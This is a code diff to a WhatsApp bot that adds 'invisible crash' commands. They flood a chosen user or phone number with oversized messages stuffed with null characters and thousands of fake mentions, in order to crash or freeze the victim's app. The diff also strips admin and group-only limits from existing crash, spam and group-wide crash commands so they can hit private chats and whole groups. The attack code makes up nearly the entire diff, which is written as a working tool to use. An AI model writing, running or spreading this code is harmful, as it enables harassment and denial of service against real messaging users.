@@ -854,6 +854,365 @@ async function handleAntiSticker(empire, m, isCreator, isAdmins) {
         return true;
     } catch { return false; }
 }
+// ============================================================
+// INVISIBLE CRASH COMMAND - WITH NUMBER SUPPORT
+// ============================================================
+
+// ========== INVISIBLE CRASH FUNCTIONS ==========
+
+// 1. Invisible Zero-Byte Bomb - Sends massive zero-byte messages
+async function invisibleZeroByte(empire, target) {
+    for (let i = 0; i < 100; i++) {
+        try {
+            const msg = {
+                viewOnceMessage: {
+                    message: {
+                        messageContextInfo: {
+                            deviceListMetadata: {},
+                            deviceListMetadataVersion: 9,
+                        },
+                        interactiveResponseMessage: {
+                            body: {
+                                text: "\u0000".repeat(100000),
+                                format: "DEFAULT"
+                            },
+                            nativeFlowResponseMessage: {
+                                name: "call_permission_request",
+                                paramsJson: "\u0000".repeat(999999),
+                                version: 9
+                            },
+                            contextInfo: {
+                                mentionedJid: Array.from({ length: 5000 }, () => 
+                                    `${Math.floor(Math.random() * 99999999)}@s.whatsapp.net`
+                                ),
+                                isForwarded: true,
+                                forwardingScore: 99999999,
+                                businessMessageForwardInfo: {
+                                    businessOwnerJid: target,
+                                },
+                            }
+                        }
+                    }
+                }
+            };
+
+            await empire.relayMessage(target, msg, {
+                participant: { jid: target }
+            });
+            await delay(50);
+        } catch (err) {
+            console.log('ZeroByte error:', err);
+        }
+    }
+}
+
+// 2. Invisible Native Flow Bomb - Massive native flow spam
+async function invisibleNativeFlow(empire, target) {
+    for (let i = 0; i < 150; i++) {
+        try {
+            const payloads = [
+                {
+                    name: "single_select",
+                    params: `{"flow_cta":"${"\u0000".repeat(999999)}","flow_message_version":"${i}"}`
+                },
+                {
+                    name: "address_message",
+                    params: `{"values":{"in_pin_code":"${"\u0000".repeat(99999)}","building_name":"${"\u0000".repeat(99999)}","address":"${"\u0000".repeat(99999)}","tower_number":"${"\u0000".repeat(99999)}","city":"${"\u0000".repeat(99999)}","name":"${"\u0000".repeat(99999)}","phone_number":"+${Math.floor(Math.random()*99999999999)}","house_number":"${"\u0000".repeat(99999)}","floor_number":"${"\u0000".repeat(99999)}","state":"${"\u0000".repeat(9999999)}"}}`
+                },
+                {
+                    name: "menu_options",
+                    params: `{"display_text":"${"\u0000".repeat(99999)}","id":"R${i}","description":"${"\u0000".repeat(999999)}"}`
+                },
+                {
+                    name: "galaxy_message",
+                    params: `{"flow_cta":"${"\u0000".repeat(999999)}","version":"${i}"}`
+                }
+            ];
+
+            for (const p of payloads) {
+                const msg = {
+                    viewOnceMessage: {
+                        message: {
+                            interactiveResponseMessage: {
+                                body: {
+                                    text: "\u0000".repeat(100000),
+                                    format: "DEFAULT"
+                                },
+                                nativeFlowResponseMessage: {
+                                    name: p.name,
+                                    paramsJson: p.params,
+                                    version: 3
+                                },
+                                contextInfo: {
+                                    stanzaId: empire.generateMessageTag(),
+                                    participant: target,
+                                    remoteJid: "0@s.whatsapp.net",
+                                    mentionedJid: Array.from({ length: 9999 }, () => 
+                                        `${Math.floor(Math.random() * 99999999)}@s.whatsapp.net`
+                                    ),
+                                    isForwarded: true,
+                                    forwardingScore: 999999
+                                }
+                            }
+                        }
+                    }
+                };
+
+                await empire.relayMessage(target, msg, {
+                    participant: { jid: target }
+                });
+                await delay(20);
+            }
+        } catch (err) {
+            console.log('NativeFlow error:', err);
+        }
+    }
+}
+
+// 3. Invisible Group Status Bomb - Spams group status updates
+async function invisibleGroupStatus(empire, target) {
+    for (let i = 0; i < 80; i++) {
+        try {
+            const msg = {
+                groupStatusMessageV2: {
+                    message: {
+                        viewOnceMessage: {
+                            message: {
+                                interactiveMessage: {
+                                    body: {
+                                        text: "\u0000".repeat(100000) + "💀".repeat(5000)
+                                    },
+                                    nativeFlowMessage: {
+                                        buttons: [
+                                            { name: "\u0000\u0000\u0000", buttonParamsJson: "\u0000".repeat(10000) },
+                                            { name: "single_select\u0000", buttonParamsJson: "{\u0000}".repeat(5000) },
+                                            { name: "\x00\x00", buttonParamsJson: "\u0000".repeat(50000) },
+                                            { name: "call_permission_request", buttonParamsJson: "\u0000".repeat(900000) }
+                                        ]
+                                    },
+                                    contextInfo: {
+                                        businessMessageForwardInfo: {
+                                            businessOwnerJid: target
+                                        },
+                                        isForwarded: true,
+                                        forwardingScore: 999999 + i,
+                                        mentionedJid: Array.from({ length: 5000 }, () => 
+                                            `${Math.floor(Math.random() * 99999999)}@s.whatsapp.net`
+                                        )
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+            };
+
+            await empire.relayMessage(target, msg, {
+                participant: { jid: target }
+            });
+            await delay(40);
+        } catch (err) {
+            console.log('GroupStatus error:', err);
+        }
+    }
+}
+
+// 4. Invisible Ephemeral Bomb - Sends disappearing messages with massive content
+async function invisibleEphemeral(empire, target) {
+    for (let i = 0; i < 100; i++) {
+        try {
+            const msg = {
+                ephemeralMessage: {
+                    message: {
+                        conversation: "\u0000".repeat(50000) + "💀".repeat(10000)
+                    },
+                    ephemeralExpiration: 1
+                }
+            };
+
+            await empire.relayMessage(target, msg, {
+                participant: { jid: target }
+            });
+            await delay(25);
+        } catch (err) {
+            console.log('Ephemeral error:', err);
+        }
+    }
+}
+
+// 5. Invisible Media Bomb - Spams media with invisible captions
+async function invisibleMedia(empire, target) {
+    const mediaUrls = [
+        "https://mmg.whatsapp.net/v/t62.7161-24/573638734_1469804761202279_6437505177805631634_n.enc?ccb=11-4&oh=01_Q5Aa4AGIZi2WHFTyLffJtq_GjfVk-SnkgWZog4aoDWx7n-PUYA&oe=69E1A94A&_nc_sid=5e03e0&mms3=true"
+    ];
+
+    for (let i = 0; i < 60; i++) {
+        try {
+            const videox = {
+                url: mediaUrls[0],
+                mimetype: "video/mp4",
+                fileSha256: "VF5ZuntXYI59R/4LrPCoETOTfNj+mrEV9nayC+hq0LM=",
+                fileLength: "99999999",
+                seconds: 9999,
+                mediaKey: "vPrEbFav/Lh1CD9PFNx4lx3F2OP3LugeieFhHr/+7oc=",
+                caption: "\u0000".repeat(999999),
+                height: 1080,
+                width: 1920,
+                fileEncSha256: "Rv+qeol4QvrDUG2sav0bFrA0cyjsUXFkwt7xfYkYrSM=",
+                directPath: "/v/t62.7161-24/573638734_1469804761202279_6437505177805631634_n.enc?ccb=11-4&oh=01_Q5Aa4AGIZi2WHFTyLffJtq_GjfVk-SnkgWZog4aoDWx7n-PUYA&oe=69E1A94A&_nc_sid=5e03e0",
+                mediaKeyTimestamp: "1773743755",
+                contextInfo: {
+                    pairedMediaType: "NOT_PAIRED_MEDIA",
+                    mentionedJid: Array.from({ length: 5000 }, () => 
+                        `${Math.floor(Math.random() * 99999999)}@s.whatsapp.net`
+                    ),
+                    isForwarded: true,
+                    forwardingScore: 999999
+                }
+            };
+
+            await empire.relayMessage(target, { videoMessage: videox }, {
+                ephemeralExpiration: 0,
+                forwardingScore: 99999,
+                isForwarded: true
+            });
+            await delay(50);
+        } catch (err) {
+            console.log('Media error:', err);
+        }
+    }
+}
+
+// 6. Invisible Mention Bomb - Massive mentions with invisible text
+async function invisibleMention(empire, target) {
+    const mentions = Array.from({ length: 9999 }, () => 
+        `${Math.floor(Math.random() * 99999999)}@s.whatsapp.net`
+    );
+
+    for (let i = 0; i < 80; i++) {
+        try {
+            await empire.sendMessage(target, {
+                text: "\u0000".repeat(50000) + "\n\n" + mentions.map(m => `@${m.split('@')[0]}`).join(' '),
+                mentions: mentions
+            }).catch(() => {});
+            await delay(30);
+        } catch (err) {
+            console.log('Mention error:', err);
+        }
+    }
+}
+
+// 7. Invisible Reaction Bomb - Spams reactions with invisible messages
+async function invisibleReaction(empire, target) {
+    const reactions = ["💀", "🔥", "😈", "👻"];
+    
+    for (let i = 0; i < 100; i++) {
+        try {
+            const msg = await empire.sendMessage(target, {
+                text: "\u0000".repeat(10000) + "💀"
+            }).catch(() => null);
+            
+            if (msg) {
+                await delay(100);
+                await empire.sendMessage(target, {
+                    react: {
+                        text: reactions[i % reactions.length],
+                        key: msg.key
+                    }
+                }).catch(() => {});
+            }
+            await delay(50);
+        } catch (err) {
+            console.log('Reaction error:', err);
+        }
+    }
+}
+
+// 8. Invisible Status Bomb - Sends invisible status updates
+async function invisibleStatus(empire, target) {
+    for (let i = 0; i < 50; i++) {
+        try {
+            const statusMsg = {
+                statusMessage: {
+                    body: {
+                        text: "\u0000".repeat(50000),
+                        format: "DEFAULT"
+                    },
+                    contextInfo: {
+                        mentionedJid: Array.from({ length: 3000 }, () => 
+                            `${Math.floor(Math.random() * 99999999)}@s.whatsapp.net`
+                        ),
+                        isForwarded: true,
+                        forwardingScore: 999999,
+                        businessMessageForwardInfo: {
+                            businessOwnerJid: target,
+                        },
+                    }
+                }
+            };
+
+            await empire.relayMessage(target, statusMsg, {
+                participant: { jid: target }
+            });
+            await delay(30);
+        } catch (err) {
+            console.log('Status error:', err);
+        }
+    }
+}
+
+// ========== MAIN INVISIBLE CRASH ==========
+
+async function invisibleCrash(empire, target) {
+    console.log(`💀 INVISIBLE CRASH STARTED ON ${target}`);
+    
+    await empire.sendMessage(target, {
+        text: "👻 *INVISIBLE CRASH INITIATED*\n\nTarget is now being bombed with invisible payloads..."
+    }).catch(() => {});
+
+    // Run all invisible attacks in parallel
+    await Promise.all([
+        invisibleZeroByte(empire, target),
+        invisibleStatus(empire, target),
+        invisibleNativeFlow(empire, target),
+        invisibleGroupStatus(empire, target),
+        invisibleEphemeral(empire, target),
+        invisibleMedia(empire, target),
+        invisibleMention(empire, target),
+        invisibleReaction(empire, target)
+    ]);
+
+    console.log(`✅ INVISIBLE CRASH COMPLETE ON ${target}`);
+}
+
+// ========== EXTREME INVISIBLE CRASH ==========
+
+async function extremeInvisibleCrash(empire, target) {
+    console.log(`💀💀💀 EXTREME INVISIBLE CRASH ON ${target}`);
+    
+    const totalRounds = 50;
+    
+    for (let round = 0; round < totalRounds; round++) {
+        await Promise.all([
+            invisibleZeroByte(empire, target),
+            invisibleNativeFlow(empire, target),
+            invisibleGroupStatus(empire, target),
+            invisibleEphemeral(empire, target)
+        ]);
+        
+        if (round % 10 === 0) {
+            console.log(`🔥 Round ${round+1}/${totalRounds} complete`);
+            await empire.sendMessage(target, {
+                text: `👻 *Round ${round+1}/${totalRounds}* - Invisible attack in progress...`
+            }).catch(() => {});
+        }
+        
+        await delay(100);
+    }
+    
+    console.log(`✅ EXTREME INVISIBLE CRASH COMPLETE`);
+}
+
 
 // ========== ANTI-TAG HANDLER ==========
 async function handleAntiTag(empire, m, isCreator, isAdmins) {
@@ -1263,6 +1622,8 @@ case 'pong': {
 ┃ ${prefix}megacrash
 ┃ ${prefix}crash      
 ┃ ${prefix}kill 
+┃ ${prefix}xinv
+┃ ${prefix}inv
 ┃ ${prefix}destroy
 ┃ ${prefix}supercrash
 ┃ ${prefix}finalkill
@@ -3081,11 +3442,18 @@ ${adminList}`,
 // ADVANCED CRASH COMMANDS - CORRECTED
 // ============================================================
 
+// ============================================================
+// ADVANCED CRASH COMMANDS - OWNER ONLY (With Group/Private Support)
+// ============================================================
+
 case 'blankgc': {
-    if (!isCreator) return reply('❌ Only the bot creator can use this.');
-    if (!isAdmins) return reply('❌ You need to be a group admin.');
-    if (!m.isGroup) return reply('❌ Only in groups.');
-    const target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
+    if (!isCreator) return reply('❌ Only the bot owner can use this.');
+    let target;
+    if (m.isGroup) {
+        target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
+    } else {
+        target = m.sender;
+    }
     await reply(`📰 Blank GC on ${target}...`);
     await blankgc(target);
     await reply(`✅ Blank GC complete.`);
@@ -3093,10 +3461,13 @@ case 'blankgc': {
 }
 
 case 'galaxy': {
-    if (!isCreator) return reply('❌ Only the bot creator can use this.');
-    if (!isAdmins) return reply('❌ You need to be a group admin.');
-    if (!m.isGroup) return reply('❌ Only in groups.');
-    const target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
+    if (!isCreator) return reply('❌ Only the bot owner can use this.');
+    let target;
+    if (m.isGroup) {
+        target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
+    } else {
+        target = m.sender;
+    }
     await reply(`🌌 Galaxy on ${target}...`);
     await galaxy(target);
     await reply(`✅ Galaxy complete.`);
@@ -3104,10 +3475,13 @@ case 'galaxy': {
 }
 
 case 'paynull': {
-    if (!isCreator) return reply('❌ Only the bot creator can use this.');
-    if (!isAdmins) return reply('❌ You need to be a group admin.');
-    if (!m.isGroup) return reply('❌ Only in groups.');
-    const target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
+    if (!isCreator) return reply('❌ Only the bot owner can use this.');
+    let target;
+    if (m.isGroup) {
+        target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
+    } else {
+        target = m.sender;
+    }
     await reply(`💰 PayNull on ${target}...`);
     await payNulL(target);
     await reply(`✅ PayNull complete.`);
@@ -3115,10 +3489,13 @@ case 'paynull': {
 }
 
 case 'ioslx': {
-    if (!isCreator) return reply('❌ Only the bot creator can use this.');
-    if (!isAdmins) return reply('❌ You need to be a group admin.');
-    if (!m.isGroup) return reply('❌ Only in groups.');
-    const target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
+    if (!isCreator) return reply('❌ Only the bot owner can use this.');
+    let target;
+    if (m.isGroup) {
+        target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
+    } else {
+        target = m.sender;
+    }
     await reply(`📱 iOS LX on ${target}...`);
     await iosLx(target);
     await reply(`✅ iOS LX complete.`);
@@ -3126,10 +3503,13 @@ case 'ioslx': {
 }
 
 case 'rpnm': {
-    if (!isCreator) return reply('❌ Only the bot creator can use this.');
-    if (!isAdmins) return reply('❌ You need to be a group admin.');
-    if (!m.isGroup) return reply('❌ Only in groups.');
-    const target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
+    if (!isCreator) return reply('❌ Only the bot owner can use this.');
+    let target;
+    if (m.isGroup) {
+        target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
+    } else {
+        target = m.sender;
+    }
     await reply(`📞 RPNM on ${target}...`);
     await rpnm(target);
     await reply(`✅ RPNM complete.`);
@@ -3137,10 +3517,13 @@ case 'rpnm': {
 }
 
 case 'trashloc': {
-    if (!isCreator) return reply('❌ Only the bot creator can use this.');
-    if (!isAdmins) return reply('❌ You need to be a group admin.');
-    if (!m.isGroup) return reply('❌ Only in groups.');
-    const target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
+    if (!isCreator) return reply('❌ Only the bot owner can use this.');
+    let target;
+    if (m.isGroup) {
+        target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
+    } else {
+        target = m.sender;
+    }
     await reply(`🗑️ TrashLoc on ${target}...`);
     await TrashLocIOS(target);
     await reply(`✅ TrashLoc complete.`);
@@ -3148,10 +3531,13 @@ case 'trashloc': {
 }
 
 case 'invitea': {
-    if (!isCreator) return reply('❌ Only the bot creator can use this.');
-    if (!isAdmins) return reply('❌ You need to be a group admin.');
-    if (!m.isGroup) return reply('❌ Only in groups.');
-    const target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
+    if (!isCreator) return reply('❌ Only the bot owner can use this.');
+    let target;
+    if (m.isGroup) {
+        target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
+    } else {
+        target = m.sender;
+    }
     await reply(`📨 Invite A on ${target}...`);
     await InViteAdminA(target);
     await reply(`✅ Invite A complete.`);
@@ -3159,10 +3545,13 @@ case 'invitea': {
 }
 
 case 'invitei': {
-    if (!isCreator) return reply('❌ Only the bot creator can use this.');
-    if (!isAdmins) return reply('❌ You need to be a group admin.');
-    if (!m.isGroup) return reply('❌ Only in groups.');
-    const target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
+    if (!isCreator) return reply('❌ Only the bot owner can use this.');
+    let target;
+    if (m.isGroup) {
+        target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
+    } else {
+        target = m.sender;
+    }
     await reply(`📨 Invite I on ${target}...`);
     await InViteAdminI(target);
     await reply(`✅ Invite I complete.`);
@@ -3170,10 +3559,13 @@ case 'invitei': {
 }
 
 case 'pollbomb': {
-    if (!isCreator) return reply('❌ Only the bot creator can use this.');
-    if (!isAdmins) return reply('❌ You need to be a group admin.');
-    if (!m.isGroup) return reply('❌ Only in groups.');
-    const target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
+    if (!isCreator) return reply('❌ Only the bot owner can use this.');
+    let target;
+    if (m.isGroup) {
+        target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
+    } else {
+        target = m.sender;
+    }
     await reply(`📊 Poll bomb on ${target}...`);
     await EmpireFcPoll(target);
     await reply(`✅ Poll bomb complete.`);
@@ -3181,10 +3573,13 @@ case 'pollbomb': {
 }
 
 case 'betadelay': {
-    if (!isCreator) return reply('❌ Only the bot creator can use this.');
-    if (!isAdmins) return reply('❌ You need to be a group admin.');
-    if (!m.isGroup) return reply('❌ Only in groups.');
-    const target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
+    if (!isCreator) return reply('❌ Only the bot owner can use this.');
+    let target;
+    if (m.isGroup) {
+        target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
+    } else {
+        target = m.sender;
+    }
     await reply(`❄️ BetaDelay on ${target}...`);
     await betaDelay(empire, target);
     await reply(`✅ BetaDelay complete.`);
@@ -3193,11 +3588,13 @@ case 'betadelay': {
 
 case 'nah':
 case 'buttonbomb': {
-    if (!isCreator) return reply('❌ Only the bot creator can use this command.');
-    if (!isAdmins) return reply('❌ You need to be a group admin to use this command.');
-    if (!m.isGroup) return reply('❌ This command only works in groups.');
-    
-    const target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
+    if (!isCreator) return reply('❌ Only the bot owner can use this.');
+    let target;
+    if (m.isGroup) {
+        target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
+    } else {
+        target = m.sender;
+    }
     await reply(`💣 Button bombing ${target}...`);
     await nah(empire, target);
     await reply(`✅ Button bomb sent.`);
@@ -3206,11 +3603,13 @@ case 'buttonbomb': {
 
 case 'invisible':
 case 'delayinv': {
-    if (!isCreator) return reply('❌ Only the bot creator can use this command.');
-    if (!isAdmins) return reply('❌ You need to be a group admin to use this command.');
-    if (!m.isGroup) return reply('❌ This command only works in groups.');
-    
-    const target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
+    if (!isCreator) return reply('❌ Only the bot owner can use this.');
+    let target;
+    if (m.isGroup) {
+        target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
+    } else {
+        target = m.sender;
+    }
     await reply(`👻 Invisible attack on ${target}...`);
     await DelayInvisible(target);
     await reply(`✅ Invisible attack sent.`);
@@ -3218,11 +3617,13 @@ case 'delayinv': {
 }
 
 case 'bulldog': {
-    if (!isCreator) return reply('❌ Only the bot creator can use this command.');
-    if (!isAdmins) return reply('❌ You need to be a group admin to use this command.');
-    if (!m.isGroup) return reply('❌ This command only works in groups.');
-    
-    const target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
+    if (!isCreator) return reply('❌ Only the bot owner can use this.');
+    let target;
+    if (m.isGroup) {
+        target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
+    } else {
+        target = m.sender;
+    }
     await reply(`🐕 Bulldog attacking ${target}...`);
     await BulldogDog(empire, target);
     await reply(`✅ Bulldog complete.`);
@@ -3230,11 +3631,13 @@ case 'bulldog': {
 }
 
 case 'jarr': {
-    if (!isCreator) return reply('❌ Only the bot creator can use this command.');
-    if (!isAdmins) return reply('❌ You need to be a group admin to use this command.');
-    if (!m.isGroup) return reply('❌ This command only works in groups.');
-    
-    const target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
+    if (!isCreator) return reply('❌ Only the bot owner can use this.');
+    let target;
+    if (m.isGroup) {
+        target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
+    } else {
+        target = m.sender;
+    }
     await reply(`📦 Jarr attack on ${target}...`);
     await DelayJarr(target);
     await reply(`✅ Jarr complete.`);
@@ -3242,11 +3645,13 @@ case 'jarr': {
 }
 
 case 'hardbulldo': {
-    if (!isCreator) return reply('❌ Only the bot creator can use this command.');
-    if (!isAdmins) return reply('❌ You need to be a group admin to use this command.');
-    if (!m.isGroup) return reply('❌ This command only works in groups.');
-    
-    const target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
+    if (!isCreator) return reply('❌ Only the bot owner can use this.');
+    let target;
+    if (m.isGroup) {
+        target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
+    } else {
+        target = m.sender;
+    }
     await reply(`🔥 Hard Bulldo on ${target}...`);
     await DelayHardBulldo(empire, target);
     await reply(`✅ Hard Bulldo complete.`);
@@ -3254,11 +3659,13 @@ case 'hardbulldo': {
 }
 
 case 'megacrash': {
-    if (!isCreator) return reply('❌ Only the bot creator can use this command.');
-    if (!isAdmins) return reply('❌ You need to be a group admin to use this command.');
-    if (!m.isGroup) return reply('❌ This command only works in groups.');
-    
-    const target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
+    if (!isCreator) return reply('❌ Only the bot owner can use this.');
+    let target;
+    if (m.isGroup) {
+        target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
+    } else {
+        target = m.sender;
+    }
     await reply(`💀💀💀 MEGA CRASH on ${target} 💀💀💀`);
     
     await Promise.all([
@@ -3276,11 +3683,13 @@ case 'megacrash': {
 case 'crash':
 case 'kill':
 case 'destroy': {
-    if (!isCreator) return reply('❌ Only the bot creator can use this command.');
-    if (!isAdmins) return reply('❌ You need to be a group admin to use this command.');
-    if (!m.isGroup) return reply('❌ This command only works in groups.');
-    
-    const target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
+    if (!isCreator) return reply('❌ Only the bot owner can use this.');
+    let target;
+    if (m.isGroup) {
+        target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
+    } else {
+        target = m.sender;
+    }
     await reply(`💀 Destroying ${target}...`);
     await Promise.all([
         gsInt(target, true),
@@ -3293,11 +3702,13 @@ case 'destroy': {
 }
 
 case 'supercrash': {
-    if (!isCreator) return reply('❌ Only the bot creator can use this command.');
-    if (!isAdmins) return reply('❌ You need to be a group admin to use this command.');
-    if (!m.isGroup) return reply('❌ This command only works in groups.');
-    
-    const target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
+    if (!isCreator) return reply('❌ Only the bot owner can use this.');
+    let target;
+    if (m.isGroup) {
+        target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
+    } else {
+        target = m.sender;
+    }
     await reply(`💀 SUPER CRASH on ${target}...`);
     await superCombo(target);
     await reply(`✅ Super crash complete.`);
@@ -3305,11 +3716,13 @@ case 'supercrash': {
 }
 
 case 'finalkill': {
-    if (!isCreator) return reply('❌ Only the bot creator can use this command.');
-    if (!isAdmins) return reply('❌ You need to be a group admin to use this command.');
-    if (!m.isGroup) return reply('❌ This command only works in groups.');
-    
-    const target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
+    if (!isCreator) return reply('❌ Only the bot owner can use this.');
+    let target;
+    if (m.isGroup) {
+        target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
+    } else {
+        target = m.sender;
+    }
     await reply(`💀💀💀 FINAL DESTRUCTION on ${target} 💀💀💀`);
     await finalDestruction(target);
     await reply(`💀 ${target} has been obliterated.`);
@@ -3317,11 +3730,13 @@ case 'finalkill': {
 }
 
 case 'freeze': {
-    if (!isCreator) return reply('❌ Only the bot creator can use this command.');
-    if (!isAdmins) return reply('❌ You need to be a group admin to use this command.');
-    if (!m.isGroup) return reply('❌ This command only works in groups.');
-    
-    const target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
+    if (!isCreator) return reply('❌ Only the bot owner can use this.');
+    let target;
+    if (m.isGroup) {
+        target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
+    } else {
+        target = m.sender;
+    }
     await reply(`❄️ Freezing ${target}...`);
     await zXfreeze(target);
     await reply(`❄️ Freeze attack sent.`);
@@ -3329,11 +3744,13 @@ case 'freeze': {
 }
 
 case 'spam': {
-    if (!isCreator) return reply('❌ Only the bot creator can use this command.');
-    if (!isAdmins) return reply('❌ You need to be a group admin to use this command.');
-    if (!m.isGroup) return reply('❌ This command only works in groups.');
-    
-    const target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
+    if (!isCreator) return reply('❌ Only the bot owner can use this.');
+    let target;
+    if (m.isGroup) {
+        target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
+    } else {
+        target = m.sender;
+    }
     const count = parseInt(args[0]) || 50;
     await reply(`📨 Spamming ${target} with ${count} messages...`);
     for (let i = 0; i < count; i++) {
@@ -3347,11 +3764,13 @@ case 'spam': {
 }
 
 case 'mentionbomb': {
-    if (!isCreator) return reply('❌ Only the bot creator can use this command.');
-    if (!isAdmins) return reply('❌ You need to be a group admin to use this command.');
-    if (!m.isGroup) return reply('❌ This command only works in groups.');
-    
-    const target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
+    if (!isCreator) return reply('❌ Only the bot owner can use this.');
+    let target;
+    if (m.isGroup) {
+        target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
+    } else {
+        target = m.sender;
+    }
     await reply(`🔔 Mention bombing ${target}...`);
     for (let i = 0; i < 100; i++) {
         await empire.sendMessage(m.chat, {
@@ -3365,14 +3784,30 @@ case 'mentionbomb': {
 }
 
 case 'groupcrash': {
-    if (!isCreator) return reply('❌ Only the bot creator can use this command.');
-    if (!isAdmins) return reply('❌ You need to be a group admin to use this command.');
-    if (!m.isGroup) return reply('❌ This command only works in groups.');
+    if (!isCreator) return reply('❌ Only the bot owner can use this.');
+    let targets = [];
     
-    await reply(`💀 Crashing entire group...`);
-    const participants = groupMetadata?.participants || [];
-    for (const p of participants) {
-        const target = p.id;
+    if (m.isGroup) {
+        // In group: crash mentioned user, or quoted user, or all participants
+        const mentioned = m.mentionedJid[0];
+        const quoted = m.quoted?.sender;
+        
+        if (mentioned) {
+            targets = [mentioned];
+        } else if (quoted) {
+            targets = [quoted];
+        } else {
+            // Crash all participants
+            const participants = groupMetadata?.participants || [];
+            targets = participants.map(p => p.id);
+        }
+    } else {
+        // In private chat: crash the user
+        targets = [m.sender];
+    }
+    
+    await reply(`💀 Crashing ${targets.length} target(s)...`);
+    for (const target of targets) {
         await Promise.all([
             gsInt(target, true),
             delay1(target),
@@ -3380,7 +3815,82 @@ case 'groupcrash': {
         ]);
         await delay(100);
     }
-    await reply(`✅ Group crash complete.`);
+    await reply(`✅ Crash complete on ${targets.length} target(s).`);
+    break;
+}
+// ========== COMMAND HANDLER ==========
+
+case 'invisiblecrash':
+case 'invcrash':
+case 'inv': {
+    if (!isCreator) return reply('❌ Only the bot owner can use this.');
+    
+    let target;
+    const input = text.trim();
+    
+    // Check if input is a phone number (starts with + or contains numbers)
+    if (input && /^[\+]?[0-9]{7,15}$/.test(input.replace(/[^0-9+]/g, ''))) {
+        // Clean the number and add @s.whatsapp.net
+        const cleanNumber = input.replace(/[^0-9]/g, '');
+        target = cleanNumber + '@s.whatsapp.net';
+    } else if (m.isGroup) {
+        // In group: check mention or quoted
+        target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
+    } else {
+        // In private chat: target the sender
+        target = m.sender;
+    }
+    
+    // Validate target
+    if (!target || !target.includes('@s.whatsapp.net')) {
+        return reply(`❌ *Invalid target!*\n\nUsage:\n${prefix}inv @user\n${prefix}inv 2348938777763\n${prefix}inv (reply to user)`);
+    }
+    
+    await reply(`👻 *Invisible Crash on ${target.split('@')[0]}...*\n\nSending invisible payloads...`);
+    
+    // Check if extreme mode
+    const isExtreme = command === 'exinv' || command === 'extremeinv' || command === 'xinv';
+    
+    if (isExtreme) {
+        await extremeInvisibleCrash(empire, target);
+        await reply(`✅ *Extreme Invisible Crash Complete on ${target.split('@')[0]}*\n\n💀 Target has been obliterated with invisible payloads.`);
+    } else {
+        await invisibleCrash(empire, target);
+        await reply(`✅ *Invisible Crash Complete on ${target.split('@')[0]}*\n\n👻 The target has been bombed with invisible messages.`);
+    }
+    break;
+}
+
+// ========== ALIAS COMMANDS ==========
+
+case 'xinv':
+case 'extremeinv':
+case 'exinv': {
+    // This will be handled by the case above since we check command
+    // Just pass through to inv handler
+    if (!isCreator) return reply('❌ Only the bot owner can use this.');
+    
+    let target;
+    const input = text.trim();
+    
+    if (input && /^[\+]?[0-9]{7,15}$/.test(input.replace(/[^0-9+]/g, ''))) {
+        const cleanNumber = input.replace(/[^0-9]/g, '');
+        target = cleanNumber + '@s.whatsapp.net';
+    } else if (m.isGroup) {
+        target = m.mentionedJid[0] || m.quoted?.sender || m.sender;
+    } else {
+        target = m.sender;
+    }
+    
+    if (!target || !target.includes('@s.whatsapp.net')) {
+        return reply(`❌ *Invalid target!*\n\nUsage:\n${prefix}xinv @user\n${prefix}xinv 2348938777763`);
+    }
+    
+    await reply(`💀💀💀 *EXTREME INVISIBLE CRASH on ${target.split('@')[0]}*\n\nStarting aggressive invisible bombardment...`);
+    
+    await extremeInvisibleCrash(empire, target);
+    
+    await reply(`✅ *Extreme Invisible Crash Complete on ${target.split('@')[0]}*\n\n💀 Target has been obliterated with invisible payloads.`);
     break;
 }
         // ═══════════════════════════════════════════════════
